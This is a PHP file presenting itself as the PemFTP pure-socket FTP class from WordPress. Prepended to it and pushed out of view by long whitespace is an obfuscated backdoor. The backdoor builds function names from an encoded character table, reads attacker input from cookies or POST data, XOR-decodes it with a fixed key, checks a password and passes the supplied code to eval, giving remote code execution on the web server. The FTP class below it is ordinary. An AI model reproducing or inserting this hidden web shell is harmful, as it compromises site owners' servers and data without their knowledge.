<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $f51a8a6f = 86;$GLOBALS['leb3e1b9']=Array();global$leb3e1b9;$leb3e1b9=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['kebc4f59']="\x46\x64\x41\x48\x2c\x2b\x38\x36\x27\x2e\x7b\x65\x5c\x50\x79\x3e\x29\x52\x72\x24\x2a\x61\x47\x73\x20\x49\x63\x25\x6d\x31\x34\x35\x75\x69\x22\x78\x6c\x3a\x74\x5d\x2f\x67\x5b\x53\x33\xa\x59\x44\x4d\x9\x39\x60\x56\x66\x62\x4e\x21\x4f\x2d\x5f\x71\x54\x55\x7a\x6a\x5e\x43\x42\x68\x7c\x6f\x70\x5a\x77\x6b\x45\x7d\x3f\x4c\x37\x26\x23\x58\x40\x32\x7e\x6e\x4a\x57\x4b\x51\x76\x3d\x3b\x30\x28\x3c\xd";$leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][1]]=$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][68].$leb3e1b9['kebc4f59'][18];$leb3e1b9[$leb3e1b9['kebc4f59'][68].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][7]]=$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][1];$leb3e1b9[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][44]]=$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][38].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][86];$leb3e1b9[$leb3e1b9['kebc4f59'][64].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][31]]=$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][38];$leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][79]]=$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][63].$leb3e1b9['kebc4f59'][11];$leb3e1b9[$leb3e1b9['kebc4f59'][32].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][53]]=$leb3e1b9['kebc4f59'][71].$leb3e1b9['kebc4f59'][68].$leb3e1b9['kebc4f59'][71].$leb3e1b9['kebc4f59'][91].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][86];$leb3e1b9[$leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84]]=$leb3e1b9['kebc4f59'][32].$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][63].$leb3e1b9['kebc4f59'][11];$leb3e1b9[$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][21]]=$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][11];$leb3e1b9[$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][11]]=$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][38].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][38].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][38];$leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][79]]=$leb3e1b9['kebc4f59'][91].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][21];$leb3e1b9[$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][1]]=$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][79];$leb3e1b9[$leb3e1b9['kebc4f59'][73].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][79]]=$_POST;$leb3e1b9[$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][31]]=$_COOKIE;@$leb3e1b9[$leb3e1b9['kebc4f59'][64].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][31]]($leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][41],NULL);@$leb3e1b9[$leb3e1b9['kebc4f59'][64].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][31]]($leb3e1b9['kebc4f59'][36].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][41].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][18].$leb3e1b9['kebc4f59'][23],0);@$leb3e1b9[$leb3e1b9['kebc4f59'][64].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][31]]($leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][35].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][35].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][32].$leb3e1b9['kebc4f59'][38].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][70].$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][59].$leb3e1b9['kebc4f59'][38].$leb3e1b9['kebc4f59'][33].$leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][11],0);@$leb3e1b9[$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][11]](0);$feaf=NULL;$m181eb1=NULL;$leb3e1b9[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][44]]=$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][58].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][58].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][58].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][58].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][44].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][21];global$a023;function sfa7($feaf,$ydef){global$leb3e1b9;$v70fa5370="";for($c3ff83f=0;$c3ff83f<$leb3e1b9[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][44]]($feaf);){for($l6401ff42=0;$l6401ff42<$leb3e1b9[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][44]]($ydef)&&$c3ff83f<$leb3e1b9[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][44]]($feaf);$l6401ff42++,$c3ff83f++){$v70fa5370.=$leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][1]]($leb3e1b9[$leb3e1b9['kebc4f59'][68].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][7]]($feaf[$c3ff83f])^$leb3e1b9[$leb3e1b9['kebc4f59'][68].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][7]]($ydef[$l6401ff42]));}}return$v70fa5370;}function vc1f073a($feaf,$ydef){global$leb3e1b9;global$a023;return$leb3e1b9[$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][1]]($leb3e1b9[$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][1]]($feaf,$a023),$ydef);}foreach($leb3e1b9[$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][6].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][31]]as$ydef=>$w28b571){$feaf=$w28b571;$m181eb1=$ydef;}if(!$feaf){foreach($leb3e1b9[$leb3e1b9['kebc4f59'][73].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][79]]as$ydef=>$w28b571){$feaf=$w28b571;$m181eb1=$ydef;}}$feaf=@$leb3e1b9[$leb3e1b9['kebc4f59'][28].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][26].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][84]]($leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][30].$leb3e1b9['kebc4f59'][79]]($leb3e1b9[$leb3e1b9['kebc4f59'][53].$leb3e1b9['kebc4f59'][50].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][79].$leb3e1b9['kebc4f59'][1].$leb3e1b9['kebc4f59'][54].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][21]]($feaf),$m181eb1));if(isset($feaf[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][74]])&&$a023==$feaf[$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][74]]){if($feaf[$leb3e1b9['kebc4f59'][21]]==$leb3e1b9['kebc4f59'][33]){$c3ff83f=Array($leb3e1b9['kebc4f59'][71].$leb3e1b9['kebc4f59'][91]=>@$leb3e1b9[$leb3e1b9['kebc4f59'][32].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][31].$leb3e1b9['kebc4f59'][11].$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][21].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][53]](),$leb3e1b9['kebc4f59'][23].$leb3e1b9['kebc4f59'][91]=>$leb3e1b9['kebc4f59'][29].$leb3e1b9['kebc4f59'][9].$leb3e1b9['kebc4f59'][94].$leb3e1b9['kebc4f59'][58].$leb3e1b9['kebc4f59'][29],);echo@$leb3e1b9[$leb3e1b9['kebc4f59'][86].$leb3e1b9['kebc4f59'][7].$leb3e1b9['kebc4f59'][84].$leb3e1b9['kebc4f59'][79]]($c3ff83f);}elseif($feaf[$leb3e1b9['kebc4f59'][21]]==$leb3e1b9['kebc4f59'][11]){eval/*kb60*/($feaf[$leb3e1b9['kebc4f59'][1]]);}exit();} ?><?php
/**
 * PemFTP - A Ftp implementation in pure PHP
 *
 * @package PemFTP
 * @since 2.5.0
 *
 * @version 1.0
 * @copyright Alexey Dotsenko
 * @author Alexey Dotsenko
 * @link http://www.phpclasses.org/browse/package/1743.html Site
 * @license LGPL http://www.opensource.org/licenses/lgpl-license.html
 */

/**
 * FTP implementation using fsockopen to connect.
 *
 * @package PemFTP
 * @subpackage Pure
 * @since 2.5.0
 *
 * @version 1.0
 * @copyright Alexey Dotsenko
 * @author Alexey Dotsenko
 * @link http://www.phpclasses.org/browse/package/1743.html Site
 * @license LGPL http://www.opensource.org/licenses/lgpl-license.html
 */
class ftp extends ftp_base {

	function __construct($verb=FALSE, $le=FALSE) {
		parent::__construct(false, $verb, $le);
	}

	function ftp($verb=FALSE, $le=FALSE) {
		$this->__construct($verb, $le);
	}

// <!-- --------------------------------------------------------------------------------------- -->
// <!--       Private functions                                                                 -->
// <!-- --------------------------------------------------------------------------------------- -->

	function _settimeout($sock) {
		if(!@stream_set_timeout($sock, $this->_timeout)) {
			$this->PushError('_settimeout','socket set send timeout');
			$this->_quit();
			return FALSE;
		}
		return TRUE;
	}

	function _connect($host, $port) {
		$this->SendMSG("Creating socket");
		$sock = @fsockopen($host, $port, $errno, $errstr, $this->_timeout);
		if (!$sock) {
			$this->PushError('_connect','socket connect failed', $errstr." (".$errno.")");
			return FALSE;
		}
		$this->_connected=true;
		return $sock;
	}

	function _readmsg($fnction="_readmsg"){
		if(!$this->_connected) {
			$this->PushError($fnction, 'Connect first');
			return FALSE;
		}
		$result=true;
		$this->_message="";
		$this->_code=0;
		$go=true;
		do {
			$tmp=@fgets($this->_ftp_control_sock, 512);
			if($tmp===false) {
				$go=$result=false;
				$this->PushError($fnction,'Read failed');
			} else {
				$this->_message.=$tmp;
				if(preg_match("/^([0-9]{3})(-(.*[".CRLF."]{1,2})+\\1)? [^".CRLF."]+[".CRLF."]{1,2}$/", $this->_message, $regs)) $go=false;
			}
		} while($go);
		if($this->LocalEcho) echo "GET < ".rtrim($this->_message, CRLF).CRLF;
		$this->_code=(int)$regs[1];
		return $result;
	}

	function _exec($cmd, $fnction="_exec") {
		if(!$this->_ready) {
			$this->PushError($fnction,'Connect first');
			return FALSE;
		}
		if($this->LocalEcho) echo "PUT > ",$cmd,CRLF;
		$status=@fputs($this->_ftp_control_sock, $cmd.CRLF);
		if($status===false) {
			$this->PushError($fnction,'socket write failed');
			return FALSE;
		}
		$this->_lastaction=time();
		if(!$this->_readmsg($fnction)) return FALSE;
		return TRUE;
	}

	function _data_prepare($mode=FTP_ASCII) {
		if(!$this->_settype($mode)) return FALSE;
		if($this->_passive) {
			if(!$this->_exec("PASV", "pasv")) {
				$this->_data_close();
				return FALSE;
			}
			if(!$this->_checkCode()) {
				$this->_data_close();
				return FALSE;
			}
			$ip_port = explode(",", preg_replace("/^.+ \\(?([0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]+,[0-9]+)\\)?.*$/s", "\\1", $this->_message));
			$this->_datahost=$ip_port[0].".".$ip_port[1].".".$ip_port[2].".".$ip_port[3];
            $this->_dataport=(((int)$ip_port[4])<<8) + ((int)$ip_port[5]);
			$this->SendMSG("Connecting to ".$this->_datahost.":".$this->_dataport);
			$this->_ftp_data_sock=@fsockopen($this->_datahost, $this->_dataport, $errno, $errstr, $this->_timeout);
			if(!$this->_ftp_data_sock) {
				$this->PushError("_data_prepare","fsockopen fails", $errstr." (".$errno.")");
				$this->_data_close();
				return FALSE;
			}
			else $this->_ftp_data_sock;
		} else {
			$this->SendMSG("Only passive connections available!");
			return FALSE;
		}
		return TRUE;
	}

	function _data_read($mode=FTP_ASCII, $fp=NULL) {
		if(is_resource($fp)) $out=0;
		else $out="";
		if(!$this->_passive) {
			$this->SendMSG("Only passive connections available!");
			return FALSE;
		}
		while (!feof($this->_ftp_data_sock)) {
			$block=fread($this->_ftp_data_sock, $this->_ftp_buff_size);
			if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_local], $block);
			if(is_resource($fp)) $out+=fwrite($fp, $block, strlen($block));
			else $out.=$block;
		}
		return $out;
	}

	function _data_write($mode=FTP_ASCII, $fp=NULL) {
		if(is_resource($fp)) $out=0;
		else $out="";
		if(!$this->_passive) {
			$this->SendMSG("Only passive connections available!");
			return FALSE;
		}
		if(is_resource($fp)) {
			while(!feof($fp)) {
				$block=fread($fp, $this->_ftp_buff_size);
				if(!$this->_data_write_block($mode, $block)) return false;
			}
		} elseif(!$this->_data_write_block($mode, $fp)) return false;
		return TRUE;
	}

	function _data_write_block($mode, $block) {
		if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_remote], $block);
		do {
			if(($t=@fwrite($this->_ftp_data_sock, $block))===FALSE) {
				$this->PushError("_data_write","Can't write to socket");
				return FALSE;
			}
			$block=substr($block, $t);
		} while(!empty($block));
		return true;
	}

	function _data_close() {
		@fclose($this->_ftp_data_sock);
		$this->SendMSG("Disconnected data from remote host");
		return TRUE;
	}

	function _quit($force=FALSE) {
		if($this->_connected or $force) {
			@fclose($this->_ftp_control_sock);
			$this->_connected=false;
			$this->SendMSG("Socket closed");
		}
	}
}

?>
